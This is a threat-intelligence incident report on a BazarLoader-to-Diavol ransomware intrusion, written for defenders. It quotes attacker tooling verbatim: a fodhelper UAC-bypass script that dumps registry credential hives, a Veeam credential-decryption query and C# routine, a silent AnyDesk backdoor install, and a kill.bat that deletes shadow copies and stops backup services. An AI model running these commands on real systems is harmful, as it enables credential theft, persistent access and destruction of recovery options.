Diavol Ransomware
thedfirreport.com/2021/12/13/diavol-ransomware/
December 13, 2021

In the past, threat actors have used BazarLoader to deploy Ryuk and Conti ransomware, as
reported on many occasions. In this intrusion, however, a BazarLoader infection resulted in
deployment of Diavol Ransomware.
First discovered in June 2021, by FortiGuard Labs, Diavol Ransomware has been suspected
to be linked to the Wizard Spider threat actor. In this report, we observed threat actors deploy
multiple Cobalt Strike DLL beacons, perform internal discovery using Windows utilities,
execute lateral movement using AnyDesk and RDP, dump credentials multiple ways, exfiltrate
data and deploy domain wide ransomware in as little as 32 hours from initial access.

Case Summary
The malware (BazarLoader) was delivered to an endpoint via email, which included a link to
OneDrive. The OneDrive link, directed the user to download a file that was a zip, which
included an ISO inside. Once opened (mounted) on the users system, it was determined the
ISO contained a LNK file and a DLL. The LNK file masqueraded as a Document enticing the
user to click/open it. Once the user executed the LNK file, the BazarLoader infection was
initiated.
As seen in previous cases, the BazarLoader infection began with internal reconnaissance of
the environment using Windows utilities such as net, nltest, and ipconfig. After being inactive
for one hour, the intrusion continued with dropping of multiple Cobalt Strike beacon DLL’s on

1/39

the beachhead. This was followed by another round of discovery from the compromised
machine. The threat actor then proceeded with execution of adf.bat, which is a script that
queries various Active Directory objects using the AdFind tool. The first run was using a
renamed binary named qq.exe and then the threat actor later dropped a properly named
AdFind binary and executed the same discovery commands again. Soon after that, with the
use of another simple batch script named fodhelper_reg_hashes.bat, they performed
credentials acquisition via dumping of SAM, SECURITY and SYSTEM registry hives.
Returning after a gap of almost 18 hours, the threat actor performed another round of network
scanning from the beachhead. This was then followed by attempts to Kerberoast and “ASREProast” using the tool Rubeus. The threat actor then moved laterally via RDP to a server
that contained file shares. After gaining access to the system they installed a remote access
application, AnyDesk, as well as Filezilla.
The threat actors used FileZilla to exfiltrate data out of the environment. They then pivoted
towards critical systems, such as domain controllers and a server that held backups. The
threat actor then dumped LSASS from one of the domain controllers, using task manager, and
then uploaded the dump file to ufile.io using Internet Explorer.
On the backup server, the threat actors attempted to dump databases associated with the
backup solution. In one attempt, they used a documented technique to recover the encoded
password and decode it using the Microsoft Data Protection API (DPAPI).
After around 42 hours post initial intrusion, the threat actors pushed towards completion of
their final objective. RDP access was established from the central file server that the threat
actors had compromised to all endpoints and a batch script named “kill.bat” was executed on
all of the targeted machines.
The script consists of commands that removes Volume Shadow copies, disables Windows
automatic startup repair, and stops all the running services on the host. Once the script
completed execution, the Diavol Ransomware was deployed via the RDP connection on each
machine by running the executable manually. From initial access, to ransomware deployment,
the threat actors took about 42 hours to deploy ransomware domain wide, but from the login
on the third day, to the last host ransom execution, only about an hour passed for the actors to
finish their deployment.

Upon accessing the link, a zip file was downloaded.

The original URL of the file can be traced from the file stream log data (Sysmon Event ID 15)
as well.

Reviewing the file stream data from Sysmon we can see that the zip contains an ISO file.

TheAnalyst reported similar BazarLoader activity via malicious emails around the same time
frame.

Execution
The BazarLoader ISO downloaded from the OneDrive link, consists of a malicious DLL and
shortcut file named “Documents.lnk” which executes the DLL via rundll32.exe.

6/39

After the initial execution, the malware contacted two of its C2 IPs:
159.223.31.75
206.189.49.239

We then observed threat actors dropping multiple Cobalt Strike Beacon DLL’s on the host in
the following file paths:
C:\Users\<user>\AppData\Local\Temp\tfpkuengdlu.dll
C:\ProgramData\temp.dll
C:\Users\<>\AppData\Local\Temp\uvvfvnnswte.dll

Persistence

7/39

A new BITS job, named “Microsoft Office Manager upgrade v24.24” was created on the
beachhead host.

The BITS job failed because the requested URL does not exist.

8/39

While reporting failure in the logs, the BITS job did re-execute the mounted ISO files every 3
hours, for the length of the intrusion on the beachhead host.

9/39

After the threat actor moved laterally, we observed them installing Anydesk on multiple clients
to create additional means of keeping access.
They used PowerShell and cmd to automate the download and installation of AnyDesk. In
order to install Anydesk for unattended access you have to set a password. The password
here was set to J9kzQ2Y0qO
(new-object
System.Net.WebClient).DownloadFile("http://download.anydesk.com/AnyDesk.exe",
"C:\ProgramData\AnyDesk.exe")
cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win
--silent
cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password
cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id

The threat actor not only leaked their password when installing AnyDesk, but they also
temporarily copied the password to the machine as the name of a text file.

This password also matches one from the leaked Conti manuals back in August.

From the Anydesk logs, we can also see the Client-ID and the IP used to access the clients.
Logs can be found at %programdata%\AnyDesk\ad_svc.trace
IP: 23.106.215.31, Client-id: 903491377

10/39

Defense Evasion
The threat actors made use of process injection through-out the intrusion. The BazaLoader
malware injected into an Edge browser process, as observed by the discovery activity, and
Cobalt Strike DLL’s activity.

11/39

Cobalt Strike processes were also observed injecting into various other processes.

12/39

Credential Access
Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using a
batch script named “fodhelper_reg_hashes.bat”.
Contents of fodhelper_reg_hashes.bat are as follows:
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save
hklm\sam c:\ProgramData\sam.save" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
/f
fodhelper.exe
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save

reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
/f
fodhelper.exe
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save

reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
/f
fodhelper.exe
reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1

They also performed enumeration of the web browser information using more.

13/39

The following files were accessed:
Users\<>\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
Users\<>\AppData\Local\Microsoft\Edge\User Data\Default\Cookies
C:\Users\<>\AppData\Local\Temp\edge-cookies.json

Using a well known technique documented on the Veeam backup forum, the threat actor
managed to decrypt passwords used by Veeam. The encryption method used by Veeam is
Data Protection API/DPAPI.
All the activity was done using RDP on the server with backups.
1. Dump the credentials using sqlcmd.exe to base64 passwords.
"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\sqlcmd.exe"
localhost,51341 -E -y0 -Q "SELECT TOP (1000) [id],[user_name],[password],[usn],
[description],[visible],[change_time_utc]FROM [VeeamBackup].[dbo].[Credentials];"

-S

1. Via RDP and notepad, they created a new file containing the code for the decryption
routine.

14/39

"C:\Windows\system32\NOTEPAD.EXE" C:\Windows\Microsoft.NET\Framework\
<version#>\veeam1.cs.txt

byte[] encryptedData = Convert.FromBase64String(a);
Console.WriteLine(b+':'+Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData,
null, DataProtectionScope.LocalMachine)));
return;
}
private static void Main(string[] args)
{
Decrypt("VATA","<BASE64 ENCODED PASSWORD HASH>");
}
}
}

15/39

1. Execute, which gave the threat actors passwords that were used by Veeam.
c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe

veeam1.cs.txt

We also observed the threat actor using Rubeus to kerberoast and asreproast the
environment.

Discovery
BazaLoader was observed executing the well known battery of Windows discovery commands
around 10 minutes after execution on the beachhead host.
net group /domain admins
net group "Domain Computers" /domain
net localgroup administrator
net view /all
nltest /domain_trusts /all_trusts

Shortly after the Cobalt Strike beacon was executed, we can see that they uploaded and ran
the well known script adf.bat. This has been observed multiple times by different ransomware
groups. The threat actor ran AdFind twice, once using adf.bat file with AdFind renamed to qq.
qq.exe -f "(objectcategory=person)"
qq.exe -f "objectcategory=computer"
qq.exe -f "(objectcategory=organizationalUnit)"
qq.exe -sc trustdmp
qq.exe -subnets -f (objectCategory=subnet)
qq.exe -f "(objectcategory=group)"
qq.exe -gcb -sc trustdmp

The second time, they copy/pasted commands from adf.bat and executed them with
AdFind.exe.
On the second day, the following commands were executed before they started working on
moving laterally in the domain.

16/39

net group "Domain Admins" /domain
whoami
nslookup
ipconfig /all
systeminfo
tasklist
net group "Enterprise admins" /domain
net localgroup administrators
whoami /all
net use
query user

During the course of the intrusion, we observed execution of the utility “Advanced IP Scanner”
to perform network scanning (over ports 21,80,445,4899,8080).

Advanced IP Scanner was downloaded using Internet Explorer on a server:

and then run with the portable option:

17/39

We also saw “MSSQLUDPScanner.exe” used for discovery of MSSQL instances across the
environment.

We believe the tool used is rvrsh3ll’s MSSQLUDPScanner

18/39

Comparing compiled version to executable from this intrusion

Before execution of AdFind.exe, adf.bat was run.

19/39

Via RDP they manually ran @carlos_perez‘s Invoke-Sharefinder.ps1 on a server. It then looks
like they manually copied the output to a file named shares.txt.

After each RDP connection to a server on the second day, the threat actor also made sure to
open up task manager to review running processes and possibly logged in users on these
systems.

20/39

Lateral Movement
We observed the threat actor using RDP as their main tool to do lateral movement in the
environment. Most likely using credentials gathered through dumping of either lsass, or the
registry hives. The first instance was through the beachhead where they used Cobalt Strike as
a reverse proxy. This also revealed their Workstation Name which is WIN-799RI0TSTOF .

21/39

After they installed AnyDesk, they used that access to RDP to other servers in the
environment as well as eventually executing their final objective using this access.

Collection
22/39

The threat actors attempted to dump a database using sqlcmd.exe but the connection to the
MSSQL server failed.
sqlcmd -E -S localhost -Q "BACKUP DATABASE master TO
DISK='c:\programdata\sql\master.bak'"

Exfiltration
On the second day of the intrusion, FileZilla was installed on one of the servers which used
SFTP to exfiltrate data to a remote computer at IP address 192.52.167.210.
Using Netflow, we were able to confirm that some amount of data (~200MB) was exfiltrated out
of the environment.

25/39

Here we can see the threat actor actively exfiltrating our information using FileZilla.

We also saw the threat actors exfiltrate databases by dragging and dropping information into
FileZilla.

26/39

After pivoting to a Domain Controller, the threat actors dumped lsass using Task Manager:

And then uploaded the dump file to ufile.io using Internet Explorer on a server.

27/39

Impact
On the third day, the threat actors began their final actions. The final actions took place from a
compromised file server. They began with a ping sweep to locate all live hosts. After that
completed, they reviewed the results on the host.

28/39

From a file server, the threat actors then established RDP connections to all the machines in
the environment. The threat actors transferred 2 files onto the machines they connected to. A
batch script named kill.bat and a ransomware executable CryptoLocker64.exe.
The batch script is responsible for deletion of volume shadow copies, turning off automatic
repairs and stopping all the running services on the host. Some of the commands are as
follows:
sc config "Netbackup Legacy Network service" start= disabled
bcdedit /set {default}
bcdedit /set {default} recoveryenabled No
vssadmin.exe Delete Shadows /all /quiet
wmic.exe Shadowcopy Delete
net stop "Zoolz 2 Service" /y
net stop "Veeam Backup Catalog Data Service" /y
net stop "Symantec System Recovery" /y
net stop "SQLsafe Filter Service" /y
net stop "SQLsafe Backup Service" /y
net stop "SQL Backups" /y
net stop "Acronis VSS Provider" /y
net stop VeeamDeploySvc /y
net stop BackupExecVSSProvider /y
net stop BackupExecRPCService /y
net stop BackupExecManagementService /y
net stop BackupExecJobEngine /y
net stop BackupExecDeviceMediaService /y

After completion of this activity, the ransomware binary was executed manually over the RDP
connections.
29/39

From the threat actors starting their ping sweep, to final host encryption, about an hour passed
leaving behind the ransom note for the organization to find. The threat actors went from initial
access to domain wide ransomware in just under two days.
